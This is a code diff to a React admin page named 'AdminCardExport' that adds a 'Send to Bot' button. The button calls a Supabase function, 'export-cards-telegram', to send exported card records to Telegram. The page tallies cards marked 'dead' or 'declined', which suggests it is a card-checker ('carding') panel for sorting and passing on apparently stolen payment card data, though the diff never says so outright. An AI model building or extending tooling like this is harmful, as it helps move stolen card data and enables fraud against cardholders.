@@ -22,6 +22,7 @@ import {
   Zap,
   Copy,
   RefreshCw,
+  Send,
 } from "lucide-react";
 import { toast } from "sonner";
 import { supabase } from "@/integrations/supabase/client";
@@ -58,6 +59,7 @@ const AdminCardExport = () => {
   const [records, setRecords] = useState<ExportRecord[]>([]);
   const [totalCount, setTotalCount] = useState(0);
   const [exported, setExported] = useState(false);
+  const [sending, setSending] = useState(false);
 
   // Paginated fetch to get all records (bypasses 1000 limit)
   const fetchAllRecords = async (query: any) => {
@@ -205,6 +207,28 @@ const AdminCardExport = () => {
     toast.success(`Copied ${records.length} cards to clipboard`);
   };
 
+  const sendToTelegram = async () => {
+    if (records.length === 0) return;
+    setSending(true);
+    try {
+      const { data, error } = await supabase.functions.invoke("export-cards-telegram", {
+        body: { exportType, searchUser: searchUser.trim() },
+      });
+
+      if (error) throw error;
+      if (data?.success) {
+        toast.success(`Sent ${data.count.toLocaleString()} cards to Telegram!`);
+      } else {
+        toast.error(data?.error || "Failed to send");
+      }
+    } catch (err) {
+      console.error("Telegram send error:", err);
+      toast.error("Failed to send to Telegram");
+    } finally {
+      setSending(false);
+    }
+  };
+
   const getExportLabel = (type: ExportType) => {
     switch (type) {
       case "all": return "All Cards";
@@ -317,14 +341,22 @@ const AdminCardExport = () => {
               <Badge className="bg-red-500/20 text-red-500 border-red-500/30">
                 {records.filter(r => r.result?.toLowerCase().includes("dead") || r.result?.toLowerCase().includes("declined")).length.toLocaleString()} Dead
               </Badge>
-              <div className="ml-auto flex gap-2">
+              <div className="ml-auto flex flex-wrap gap-2">
                 <Button variant="outline" size="sm" onClick={copyToClipboard}>
                   <Copy className="h-3.5 w-3.5 mr-1.5" />
-                  Copy Cards
+                  Copy
                 </Button>
-                <Button size="sm" onClick={downloadFile}>
+                <Button variant="outline" size="sm" onClick={downloadFile}>
                   <Download className="h-3.5 w-3.5 mr-1.5" />
-                  Download .txt
+                  Download
+                </Button>
+                <Button size="sm" onClick={sendToTelegram} disabled={sending} className="bg-blue-600 hover:bg-blue-700">
+                  {sending ? (
+                    <Loader2 className="h-3.5 w-3.5 mr-1.5 animate-spin" />
+                  ) : (
+                    <Send className="h-3.5 w-3.5 mr-1.5" />
+                  )}
+                  {sending ? "Sending..." : "Send to Bot"}
                 </Button>
               </div>
             </div>
